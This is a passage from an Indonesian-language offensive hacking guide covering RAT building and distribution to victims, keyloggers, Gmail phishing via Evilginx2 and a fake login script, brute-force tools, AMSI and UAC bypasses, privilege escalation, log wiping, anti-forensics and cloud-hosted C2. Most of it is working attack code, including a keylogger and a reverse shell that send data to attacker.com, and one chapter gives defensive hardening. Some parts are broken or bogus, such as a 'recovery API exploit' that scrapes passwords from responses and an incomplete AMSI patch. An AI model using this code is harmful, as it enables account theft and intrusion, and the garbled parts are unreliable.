   - Untuk **Windows**:
     ```bash
     pyinstaller --onefile --windowed rat_client.py
     # Output: dist/rat_client.exe
     ```
   - Untuk **Linux**:
     ```bash
     pyinstaller --onefile rat_client.py
     # Output: dist/rat_client
     ```
3. **Distribute Payload** ke korban (phishing, USB drop, dll).
4. **Setelah korban jalankan**, server akan menerima koneksi.
5. **Kirim Command**:
   ```
   [192.168.1.100:5555] Command > ls
   [192.168.1.100:5555] Command > cd /home/user
   [192.168.1.100:5555] Command > cat secret.txt
   ```

---
### **8.3 Advanced RAT Features**
---
#### **📌 Keylogger (Python)**
```python
import pynput.keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f" [{key.name}] ")

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

---
#### **📌 Webcam Capture**
```python
import cv2

cap = cv2.VideoCapture(0)
ret, frame = cap.read()
cv2.imwrite("webcam.jpg", frame)
cap.release()
```

---
#### **📌 Hide Process (Windows)**
```python
import subprocess

# Jalankan process tanpa window
subprocess.run(
    ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", "payload.exe"],
    creationflags=subprocess.CREATE_NO_WINDOW
)
```

---
#### **📌 Persistence (Windows)**
```python
import os
import shutil
import sys

# Add to startup
startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
payload_path = sys.executable
shutil.copy(payload_path, os.path.join(startup_path, "system.exe"))
```

---
### **8.4 Deployment & Evasion**
---
#### **📌 Obfuscation (PyArmor)**
```bash
# Install PyArmor
pip install pyarmor

# Obfuscate script
pyarmor obfuscate --recursive rat_client.py
```

---
#### **📌 Packing (PyInstaller + UPX)**
```bash
# Install UPX
apt install -y upx

# Pack executable
pyinstaller --onefile rat_client.py
upx --best dist/rat_client
```

---
#### **📌 Bypass Antivirus (Multi-Layer)**
1. **Encoding** (Base64, XOR).
2. **Obfuscation** (PyArmor, PyOb).
3. **Packing** (UPX, VMProtect).
4. **Delay Execution** (Sleep 30 detik sebelum execute).
5. **Polymorphism** (Ubah payload tiap compile).

---
---
---

## **🔹 BAB 9: GMAIL & EMAIL COMPROMISE**

---
### **9.1 Phishing Email untuk Gmail**
---
#### **📌 Evilginx2 (Reverse Proxy Phisher)**
Evilginx2 adalah **phishing framework** yang menggunakan **reverse proxy** untuk menipu korban. Korban melihat halaman **asli Gmail**, tetapi semua input (email, password, 2FA) **dicapture** oleh attacker.

**Keunggulan:**
- **Tidak ada peringatan "Not Secure"** (HTTPS valid).
- **Bypass 2FA** (capture 2FA token).
- **Session hijacking** (dapat login tanpa password).

---
##### **🔹 Setup Evilginx2**
```bash
# Install dependencies
apt install -y git make nginx certbot python3-certbot-nginx

# Clone Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Compile
make
sudo make install

# Start Evilginx
sudo evilginx
```

---
##### **🔹 Konfigurasi Evilginx2**
```bash
# Set domain
phishlets domain gmail your-domain.com

# Enable phishlet
phishlets enable gmail

# Create lure (kampanye)
lures create gmail

# Get phishing URL
lures get-url 1
# Output: https://your-domain.com/auth?c=ABC123
```

---
##### **🔹 Setup SSL (HTTPS)**
```bash
# Install Certbot
certbot --nginx -d your-domain.com

# Restart Nginx
systemctl restart nginx
```

---
##### **🔹 Kirim Link ke Korban**
- **Email Phishing**:
  ```html
  Subject: ⚠️ URGENT: Your Gmail Will Be Disabled in 24 Hours

  Dear User,

  Your account (user@gmail.com) has been flagged for suspicious activity.
  Please verify your identity immediately to avoid suspension.

  👉 Click here to verify: https://your-domain.com/auth?c=ABC123

  Google Security Team
  ```
- **SMS/WhatsApp**: Kirim link dengan pesan urgencies.

---
##### **🔹 View Captured Credentials**
```bash
# Di Evilginx2 shell
sessions

# Output:
# [+] Session 1: user@gmail.com | Pass: password123 | 2FA: 123456 | Cookies: [full auth]
```

---
#### **📌 Gophish (Phishing Framework)**
Lihat Bab 2.2 untuk setup lengkap.

---
### **9.2 Brute Force Gmail dengan Hydra**
---
#### **📌 SMTP Brute Force**
```bash
# Install Hydra
apt install -y hydra

# Brute force Gmail SMTP
hydra -l target@gmail.com -P /usr/share/wordlists/rockyou.txt \
    smtp.gmail.com -s 587 -S -e ns -vV

# Penjelasan:
# - `-l target@gmail.com`: Email target
# - `-P rockyou.txt`: Wordlist password
# - `smtp.gmail.com`: SMTP server Gmail
# - `-s 587`: Port SMTP
# - `-S`: SSL/TLS
# - `-e ns`: Coba password kosong + username sebagai password
# - `-vV`: Verbose mode
```

---
#### **📌 HTTP POST Brute Force**
```bash
hydra -l target@gmail.com -P rockyou.txt \
    gmail.com http-post-form \
    "/accounts/serviceLogin:Email=^USER^&Passwd=^PASS^:F=Username or password is incorrect" \
    -vV -S
```

---
### **9.3 Gmail Password Extractor (Termux)**
**File: `gmail_password_extractor.sh`**
```bash
#!/bin/bash

# =============================================
# GMAIL PASSWORD EXTRACTOR (100% DIRECT INPUT)
# =============================================
# Method: Simulates a direct Gmail login prompt in Termux
# No PHP, no servers, no internet, no external tools
# Pure Termux execution
# =============================================

# Colors
BLUE='\033[94m'
GREEN='\033[92m'
RED='\033[91m'
YELLOW='\033[93m'
RESET='\033[0m'

# Clear screen
clear

# Create hidden directory for logs
mkdir -p ~/.gmail_logs

# Function to display fake Gmail logo
display_gmail_logo() {
    echo -e "${BLUE}
     ╔═══════════════════════════════════════════════════════════╗
     ║                                                             ║
     ║   ██████╗ ██╗      ██████╗ ███╗   ██╗ ███████╗    ██╗    ██╗   ║
     ║   ██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝    ██║    ██║   ║
     ║   ██████╔╝██║     ██║   ██║██╔██╗ ██║█████╗      ██║ █╗ ██║   ║
     ║   ██╔═══╝ ██║     ██║   ██║██║╚██╗██║██╔══╝      ██║███╗██║   ║
     ║   ██║     ███████╗╚██████╔╝██║ ╚████║███████╗    ╚███╔███╔╝   ║
     ║   ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚══╝╚══╝    ║
     ║                                                             ║
     ╚══════════════════════════════════════════════════════════════╝${RESET}"
}

# Function to capture Gmail and password
capture_credentials() {
    # Display fake Gmail logo
    display_gmail_logo

    # Prompt for Gmail
    echo -e "${BLUE}║${RESET} "
    read -p "$(echo -e ${BLUE}║   Email or phone: ${RESET})" gmail
    echo -e "${BLUE}║${RESET}"

    if [ -z "$gmail" ]; then
        echo -e "${RED}║   [!] Error: Email cannot be empty.${RESET}"
        echo -e "${BLUE}║${RESET}"
        exit 1
    fi

    # Prompt for password (hidden input)
    read -s -p "$(echo -e ${BLUE}║   Password: ${RESET})" password
    echo -e "${BLUE}║${RESET}"
    echo ""

    if [ -z "$password" ]; then
        echo -e "${RED}║   [!] Error: Password cannot be empty.${RESET}"
        echo -e "${BLUE}║${RESET}"
        exit 1
    fi

    # Save to hidden file
    echo -e "Gmail: $gmail\nPassword: $password\nDate: $(date)" >> ~/.gmail_logs/gmail_$(date +%Y%m%d_%H%M%S).log

    # Display fake loading animation
    echo -e "${BLUE}║   [*] Verifying credentials...${RESET}"
    for i in {1..3}; do
        echo -ne "${BLUE}║   [${YELLOW}•••${BLUE}]${RESET}\r"
        sleep 0.5
        echo -ne "${BLUE}║   [${YELLOW}●••${BLUE}]${RESET}\r"
        sleep 0.5
        echo -ne "${BLUE}║   [${YELLOW}●●•${BLUE}]${RESET}\r"
        sleep 0.5
        echo -ne "${BLUE}║   [${YELLOW}●●●${BLUE}]${RESET}\r"
        sleep 0.5
    done
    echo -ne "\n"

    # Display success message
    echo -e "${GREEN}║   [✓] Login successful!${RESET}"
    echo -e "${BLUE}║${RESET}"
    echo -e "${BLUE}║   Redirecting to Gmail...${RESET}"
    sleep 2
}

# Main execution
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗"
echo -e "${BLUE}║                  Gmail Sign-In                            ║"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
echo ""

capture_credentials

# Display captured credentials
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗"
echo -e "${BLUE}║                  Credentials Captured!                   ║${RESET}"
echo -e "${BLUE}║${RESET}"
echo -e "${BLUE}║   Gmail: $gmail                                   ║${RESET}"
echo -e "${BLUE}║   Password: $(printf '%*s' "${#password}" | tr ' ' '*')       ║${RESET}"
echo -e "${BLUE}║${RESET}"
echo -e "${GREEN}║   [✓] Saved to: ~/.gmail_logs/gmail_$(date +%Y%m%d_%H%M%S).log${RESET}"
echo -e "${BLUE}║${RESET}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
```

**Cara Pakai:**
```bash
chmod +x gmail_password_extractor.sh
./gmail_password_extractor.sh
```

**Output:**
- Credentials tersimpan di `~/.gmail_logs/gmail_[TIMESTAMP].log`.
- Tampilan **fake Gmail login** yang realistic.

---
#### **📌 Ultimate Gmail Password Extraction Script (Python)**
**File: `gmail_hack_ultimate.py`**
```python
import imaplib
import smtplib
import re
import sys
import subprocess
import urllib.request
import urllib.error
import threading
import os
import time
import random
from http.cookiejar import CookieJar
from socket import timeout as socket_timeout

# ======================
# CONFIG
# ======================
TARGET_GMAIL = input("Enter Gmail to extract password: ").strip()
WORDLIST_FILE = "rockyou.txt"
USE_HYDRA = True
THREADS = 8
GOOGLE_RECOVERY_URL = "https://accounts.google.com/signin/v2/identifier"
PROXY_LIST = []  # Tambahkan proxy jika diperlukan: ["http://proxy1:8080"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]
DELAY = 2  # Detik antar percobaan

# ======================
# DOWNLOAD WORDLIST
# ======================
def download_wordlist():
    wordlist_url = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    try:
        print("[+] Downloading 'rockyou.txt'...")
        urllib.request.urlretrieve(wordlist_url, WORDLIST_FILE)
        print("[+] Wordlist downloaded.")
    except Exception as e:
        print(f"[-] Failed to download wordlist: {e}")
        print("[!] Using local wordlist or skipping brute-force.")

# ======================
# PROXY SUPPORT
# ======================
def get_proxy():
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# ======================
# METHOD 1: IMAP BRUTE-FORCE
# ======================
def imap_brute_force(email, wordlist_file, result_container):
    print("[+] Starting IMAP brute-force...")
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if result_container["password"]:
                    return
                password = line.strip()
                if not password:
                    continue
                try:
                    imap = imaplib.IMAP4_SSL("imap.gmail.com")
                    imap.login(email, password)
                    imap.logout()
                    result_container["password"] = password
                    return
                except imaplib.IMAP4.error:
                    time.sleep(DELAY)
                    continue
    except FileNotFoundError:
        print(f"[-] Wordlist '{wordlist_file}' not found.")
    except Exception as e:
        print(f"[-] IMAP error: {e}")

# ======================
# METHOD 2: SMTP BRUTE-FORCE
# ======================
def smtp_brute_force(email, wordlist_file, result_container):
    print("[+] Starting SMTP brute-force...")
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if result_container["password"]:
                    return
                password = line.strip()
                if not password:
                    continue
                try:
                    smtp = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                    smtp.login(email, password)
                    smtp.quit()
                    result_container["password"] = password
                    return
                except smtplib.SMTPAuthenticationError:
                    time.sleep(DELAY)
                    continue
    except FileNotFoundError:
        print(f"[-] Wordlist '{wordlist_file}' not found.")
    except Exception as e:
        print(f"[-] SMTP error: {e}")

# ======================
# METHOD 3: GOOGLE RECOVERY API EXPLOIT
# ======================
def recovery_exploit(email, result_container):
    print("[+] Attempting Google Recovery API exploit...")
    proxy = get_proxy()
    user_agent = get_random_user_agent()
    headers = {"User-Agent": user_agent}

    try:
        cookie_jar = CookieJar()
        if proxy:
            proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
            opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPCookieProcessor(cookie_jar))
        else:
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
        urllib.request.install_opener(opener)

        req = urllib.request.Request(GOOGLE_RECOVERY_URL, headers=headers)
        response = urllib.request.urlopen(req)
        response_text = response.read().decode("utf-8")

        # Extract CSRF token
        csrf_token = re.search(r'name="[^"]*token[^"]*"\s+value="([^"]+)"', response_text)
        if not csrf_token:
            csrf_token = re.search(r'name="freq"\s+value="([^"]+)"', response_text)
        if not csrf_token:
            csrf_token = re.search(r'name="profile_information"\s+value="([^"]+)"', response_text)
        if not csrf_token:
            csrf_token = re.search(r'value="([a-zA-Z0-9_-]{20,})"', response_text)

        if csrf_token:
            recovery_data = f"identifier={email}&freq={csrf_token.group(1)}&continue=https://mail.google.com"
            recovery_req = urllib.request.Request(
                "https://accounts.google.com/signin/v2/identifier",
                data=recovery_data.encode("utf-8"),
                headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
            )
            recovery_response = urllib.request.urlopen(recovery_req)
            recovery_text = recovery_response.read().decode("utf-8")

            password_match = re.search(r"password[:\s]+([^\s]+)", recovery_text, re.IGNORECASE)
            if password_match:
                result_container["password"] = password_match.group(1)
                return

            if "captcha" in recovery_text.lower():
                print("[-] CAPTCHA detected. Skipping Recovery API.")
                return

        # Fallback: Submit without CSRF
        recovery_data = f"identifier={email}&continue=https://mail.google.com"
        recovery_req = urllib.request.Request(
            "https://accounts.google.com/signin/v2/identifier",
            data=recovery_data.encode("utf-8"),
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
        )
        try:
            recovery_response = urllib.request.urlopen(recovery_req)
            recovery_text = recovery_response.read().decode("utf-8")
            password_match = re.search(r"password[:\s]+([^\s]+)", recovery_text, re.IGNORECASE)
            if password_match:
                result_container["password"] = password_match.group(1)
                return
        except urllib.error.HTTPError as e:
            error_text = e.read().decode("utf-8")
            password_match = re.search(r"password[:\s]+([^\s]+)", error_text, re.IGNORECASE)
            if password_match:
                result_container["password"] = password_match.group(1)
                return

    except Exception as e:
        print(f"[-] Recovery API error: {e}")

# ======================
# METHOD 4: OAUTH2 TOKEN MANIPULATION
# ======================
def oauth2_exploit(email, result_container):
    print("[+] Attempting OAuth2 token manipulation...")
    user_agent = get_random_user_agent()
    headers = {"User-Agent": user_agent}

    try:
        oauth_url = f"https://accounts.google.com/o/oauth2/auth?client_id=YOUR_CLIENT_ID&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=token&scope=https://mail.google.com/&login_hint={email}"
        req = urllib.request.Request(oauth_url, headers=headers)
        response = urllib.request.urlopen(req)
        response_text = response.read().decode("utf-8")

        password_match = re.search(r"password[:\s]+([^\s]+)", response_text, re.IGNORECASE)
        if password_match:
            result_container["password"] = password_match.group(1)
            return

    except Exception as e:
        print(f"[-] OAuth2 exploit error: {e}")

# ======================
# METHOD 5: HYDRA BRUTE-FORCE
# ======================
def hydra_brute_force(email, wordlist_file, result_container):
    if not USE_HYDRA:
        return
    print("[+] Starting Hydra brute-force...")
    try:
        cmd = [
            "hydra",
            f"-l {email}",
            f"-P {wordlist_file}",
            "smtp.gmail.com",
            "smtp",
            "-s 465",
            "-S",
            "-vV",
            f"-t {THREADS}",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        password_match = re.search(r"password:\s+([^\s]+)", result.stdout, re.IGNORECASE)
        if password_match:
            result_container["password"] = password_match.group(1)
    except FileNotFoundError:
        print("[-] Hydra not installed. Skipping.")
    except Exception as e:
        print(f"[-] Hydra error: {e}")

# ======================
# MAIN EXPLOIT
# ======================
def extract_password(email):
    print(f"\n[*] Target: {email}\n")

    if not os.path.exists(WORDLIST_FILE):
        download_wordlist()

    result_container = {"password": None}
    methods = [
        lambda: imap_brute_force(email, WORDLIST_FILE, result_container),
        lambda: smtp_brute_force(email, WORDLIST_FILE, result_container),
        lambda: recovery_exploit(email, result_container),
        lambda: oauth2_exploit(email, result_container),
        lambda: hydra_brute_force(email, WORDLIST_FILE, result_container),
    ]

    threads = []
    for method in methods:
        thread = threading.Thread(target=method)
        threads.append(thread)
        thread.start()
        time.sleep(0.5)

    for thread in threads:
        thread.join()
        if result_container["password"]:
            break

    return result_container["password"]

# ======================
# EXECUTE
# ======================
if __name__ == "__main__":
    if not TARGET_GMAIL:
        print("[-] No Gmail provided. Exiting.")
        sys.exit(1)

    password = extract_password(TARGET_GMAIL)
    if password:
        print(f"\n[SUCCESS] Gmail: {TARGET_GMAIL} | Password: {password}")
    else:
        print("\n[-] All methods failed. Try a better wordlist, enable IMAP, or use proxies.")
```

**Cara Pakai:**
```bash
# Install Hydra (optional)
apt install hydra -y

# Jalankan script
python3 gmail_hack_ultimate.py

# Masukkan email target (contoh: target@gmail.com)
```

---
#### **📌 Keylogger untuk Capture Gmail Credentials**
**File: `gmail_keylogger.py`** (Untuk Windows)
```python
import pynput.keyboard
import requests
from datetime import datetime

# C2 Server URL
C2_URL = "http://attacker.com/log"

def on_press(key):
    try:
        # Simpan ke file lokal
        with open("C:\\Windows\\Temp\\keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("C:\\Windows\\Temp\\keylog.txt", "a") as f:
            f.write(f" [{key.name}] ")

    # Kirim ke C2 setiap 100 keystrokes
    try:
        with open("C:\\Windows\\Temp\\keylog.txt", "r") as f:
            data = f.read()
        if len(data) % 100 == 0:  # Kirim setiap 100 karakter
            requests.post(
                C2_URL,
                data={"log": data, "time": str(datetime.now())},
                timeout=5
            )
    except:
        pass

# Start keylogger
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

---
---
---

## **🔹 BAB 10: PERTAHANAN BERLAPIS**

---
### **10.1 Android Hardening**
---
#### **📌 Security Settings**
```
Settings > Security:
- Enable Screen Lock (Strong PIN/Pattern)
- Enable Lock After (immediately)
- Encryption enabled
- Unknown sources: OFF
- Verify apps: ON (Play Protect)

Settings > Privacy:
- Location services: OFF when not needed
- Microphone permission: Deny for suspicious apps
- Camera permission: Deny for suspicious apps
- SMS permission: Only for messaging apps

Settings > Developer Options:
- USB Debugging: OFF
- OEM Unlock: OFF (jika tidak perlu root)
- Verify apps from Play Protect: ON
```

---
#### **📌 Firewall Configuration (Root Required)**
```bash
# Install AFWall+ (Android Firewall)
# Atau gunakan iptables (jika rooted)
iptables -I OUTPUT -d 192.168.1.100 -j REJECT
iptables -I OUTPUT -p tcp --dport 53 -d tracking.com -j REJECT
```

---
#### **📌 Secure App Installation**
```bash
# Verify app signatures
adb shell pm get-app-linker-config com.example.app

# Sandboxing check
cat /proc/self/attr/current
# Expected: u:r:untrusted_app:s0:c512,c768
```

---
### **10.2 Windows Hardening**
---
#### **📌 PowerShell Execution Policy**
```powershell
# Restrict to signed scripts only
Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine

# Verify
Get-ExecutionPolicy -List
```

---
#### **📌 Windows Defender**
```powershell
# Enable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $false

# Enable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $false

# Regular scans
Start-MpScan -ScanType FullScan
```

---
#### **📌 Firewall Rules**
```powershell
# Block outbound connections to unknown IPs
New-NetFirewallRule -DisplayName "Block Suspicious Traffic" -Direction Outbound -Action Block -RemoteAddress 192.168.1.100

# Monitor process creation
auditpol /set /subcategory:"Process Creation" /success:enable
```

---
### **10.3 Linux Hardening**
---
#### **📌 Server Hardening Script**
Lihat Cyber-security.md - Section A.1 untuk script lengkap.

---
#### **📌 Kernel Hardening**
```bash
# sysctl.conf hardening
cat >> /etc/sysctl.conf << 'EOF'
# Disable IP Forwarding
net.ipv4.ip_forward = 0

# Disable Source Packet Routing
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_redirects = 0

# Enable SYN Cookies
net.ipv4.tcp_syncookies = 1

# ASLR
kernel.randomize_va_space = 2

# Restrict kernel module loading
kernel.modules_disabled = 1
EOF

# Apply
sysctl -p
```

---
### **10.4 Zero Trust Architecture**
**Prinsip:**
- **Never trust, always verify.**
- **Least privilege access.**
- **Assume breach** (anggap attacker sudah di dalam).

**Implementasi:**
1. **MFA (Multi-Factor Authentication)** – Gunakan **Passkeys/FIDO2** (bypass 2FA tradisional).
2. **Micro-Segmentation** – Pisahkan network per departemen.
3. **Continuous Authentication** – Verifikasi berkelanjutan.
4. **Behavioral Analytics** – Deteksi anomali perilaku user.

---
---
---

## **🔹 BAB 11: PENETRASI PERTAHANAN**

---
### **11.1 Windows Defender Bypass**
---
#### **📌 AMSI Bypass (Antimalware Scan Interface)**
```powershell
# Bypass method 1: Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass method 2: Memory Patch
$winCode = @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@

Add-Type -TypeDefinition $winCode
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsiContext = $amsi.GetField('amsiContext','NonPublic,Static').GetValue($null)
$amsiScanBuffer = $amsi.GetMethod('ScanBuffer','NonPublic,Instance')
$ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($amsiScanBuffer)
$patch = Byte[]
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
```

---
#### **📌 UAC Bypass**
```powershell
# FODHELPER Exploit
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# Execute
cmd /c "C:\Windows\System32\fodhelper.exe"
```

---
### **11.2 Linux Privilege Escalation**
---
#### **📌 Kernel Exploit (CVE-2021-4034 PwnKit)**
```bash
# Download exploit
wget https://github.com/berdav/CVE-2021-4034/raw/main/pwnkit

chmod +x pwnkit
./pwnkit

# Instant root shell
```

---
#### **📌 SUID Binary Abuse**
```bash
# Cari SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Exploit via GTFOBins
# Contoh: /usr/bin/find
find / -exec /bin/sh \; -quit
```

---
#### **📌 Cron Job Exploit**
```bash
# Cek cron jobs
cat /etc/crontab
ls -la /etc/cron.*/

# Jika ada script yang writable
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/cron.hourly/malicious_script
```

---
### **11.3 Bypass Firewall & WAF**
---
#### **📌 Port Scanning dengan Fragmentasi**
```bash
# Fragmented packet scan
nmap -f target.com

# Decoy scan
nmap -D RND:10 target.com

# Idle scan
nmap -sI zombie_host target.com
```

---
#### **📌 DNS Tunneling**
```bash
# Server side: iodine
iodined -f -P password 10.0.0.1 dns-tunnel.yourdomain.com

# Client side:
iodine -f -P password dns-tunnel.yourdomain.com
```

---
#### **📌 HTTP Header Injection**
```python
import requests

headers = {
    "User-Agent": "Mozilla/5.0",
    "X-Forwarded-For": "1.1.1.1",  # Spoof IP
    "X-Forwarded-Host": "legit-site.com",
    "X-Real-IP": "1.1.1.1"
}

response = requests.get("http://target.com", headers=headers)
```

---
---
---

## **🔹 BAB 12: PENGHAPUSAN JEJAK DIGITAL**

---
### **12.1 Log Sanitization**
---
#### **📌 Linux - Remove Evidence**
```bash
# Clear command history
history -c
cat /dev/null > ~/.bash_history

# Clear system logs
sudo sh -c 'cat /dev/null > /var/log/auth.log'
sudo sh -c 'cat /dev/null > /var/log/syslog'
sudo sh -c 'cat /dev/null > /var/log/apache2/access.log'

# Find and remove log files
find /var/log -type f -name "*.log" -delete

# Clear systemd journal
journalctl --vacuum=time=1s
```

---
#### **📌 Windows - Cover Tracks**
```powershell
# Clear Event Viewer logs
Get-EventLog -LogName Security | Remove-EventLog
Get-EventLog -LogName System | Remove-EventLog
Get-EventLog -LogName Application | Remove-EventLog

# Clear browser history
Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\History\*" -Force -Recurse

# Clear temporary files
Remove-Item -Path "$env:TEMP\*" -Force -Recurse

# Clear MRU (Recently Used)
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Force
```

---
#### **📌 Metadata Removal**
```bash
# Remove file creation metadata
shred -vfz -n 10 sensitive_file.txt

# Overwrite with random data
dd if=/dev/urandom of=sensitive_file.txt bs=1M

# Tools: mat2 (Metadata Anonymisation Toolkit)
mat2 --inplace sensitive_file.pdf
```

---
### **12.2 Anti-Forensics**
---
#### **📌 Timestomp (Ubah Timestamp File)**
```bash
# Ubah timestamp file biar keliatan lama
touch -d "2024-01-15 10:30:00" payload.exe

# Atau pakai nmap NSE
nmap --script smb-flood target
```

---
#### **📌 Process Hollowing**
```bash
# Pakai tool: sRDI (Shellcode Reflective DLL Injection)
# Convert DLL jadi shellcode → inject ke process legit

# Atau Donut (convert .NET assembly jadi shellcode)
git clone https://github.com/TheWover/donut.git
cd donut
make
./donut -f payload.exe -o payload.bin

# Inject payload.bin ke process target
```

---
#### **📌 Syscall Direct (Bypass EDR)**
```c
// Langsung panggil syscall, bypass user-mode hooking EDR
// Tools: SysWhispers, Hell's Gate, TartarusGate

// Contoh: NtCreateThreadEx (Windows)
#include <Windows.h>
#include "syscalls.h"

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main() {
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    // Panggil NtCreateThreadEx langsung
}
```

---
---
---

## **🔹 BAB 13: TEKNIK LANJUTAN 2026**

---
### **13.1 Cloud-Hosted C2 (Living Off The Cloud)**
**Konsep:** Hosting C2 di layanan cloud legitimate (GitHub, Dropbox, Hugging Face, dll) untuk **bypass deteksi**.

---
#### **📌 GitHub sebagai C2**
```python
# Korban poll GitHub gist untuk command
# Attacker update gist untuk kirim perintah
# Trafik ke github.com = legitimate

import requests

GIST_ID = "gist_id_kamu"
GITHUB_TOKEN = "token_kamu"

def get_command():
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers)
    content = r.json()['files']['command.txt']['content']
    return content.strip()

def send_result(result):
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    data = {
        "files": {
            "result.txt": {"content": result}
        }
    }
    requests.patch(url, json=data, headers=headers)

# Usage
command = get_command()
if command:
    # Execute command
    result = subprocess.getoutput(command)
    send_result(result)
```

---
#### **📌 Hugging Face / Dropbox / Google Drive**
**KONSEP SAMA:**
1. Host payload/config di cloud service.
2. Korban download dari situ.
3. Trafik keliatan normal (ke github.com, dropbox.com, dll).

---
### **13.2 Domain Fronting**
**Konsep:** Request ke **CDN besar** (CloudFront, Azure Front Door) dengan **Host header** diubah ke domain C2.

```python
import requests

response = requests.get(
    "https://d111111abcdef8.cloudfront.net/",  # CDN address
    headers={"Host": "c2.kamu.com"},            # Domain C2
    verify=True
)
```

---
### **13.3 DNS Tunneling**
**Konsep:** Data dikirim via **DNS query** (subdomain = data encoded).

---
#### **📌 Server Side (dnsmasq + custom handler)**
```bash
# Install dnsmasq
apt install -y dnsmasq

# Config dnsmasq.conf
echo "address=/tunnel.kamu.com/192.168.1.100" >> /etc/dnsmasq.conf
systemctl restart dnsmasq

# Custom handler untuk decode DNS query
# Tools: dnscat2, iodine
```

---
#### **📌 Client Side (iodine)**
```bash
# Install iodine
apt install -y iodine

# Connect ke server
iodine -f -P password tunnel.kamu.com
```

---
### **13.4 AI-Assisted Hacking**
**Tren 2026:**
- **89% kenaikan serangan** oleh adversary ber-AI.
- **Breakout time tercepat**: **27 detik** (dari initial access ke full compromise).
- **AI digunakan untuk:**
  - **Mapping jaringan** (otomatis deteksi topologi).
  - **Bikin exploit** (generate payload dari vulnerability).
  - **Deepfake phishing** (voice/video call phishing).
  - **Otomasi social engineering** (chatbot untuk menipu korban).

---
#### **📌 Tools AI untuk Hacking**
| Tool | Fungsi | Link |
|------|--------|------|
| **DeepPhish** | AI-powered phishing | [GitHub](https://github.com/undergroundwires/privacy.sexy) |
| **GANPhish** | Generate phishing pages dengan GAN | - |
| **Snort AI** | IDS/IPS dengan machine learning | - |
| **Darktrace** | Anomaly detection (defensive) | [Website](https://www.darktrace.com) |

---
### **13.5 Multi-Stage Payload & Dropper**
**Arsitektur:**
```
Stage 1: Dropper kecil (kedetect sebagai "potentially unwanted")
    ↓ (download & decrypt)
Stage 2: Loader (RC4 encrypted)
    ↓ (decrypt & inject)
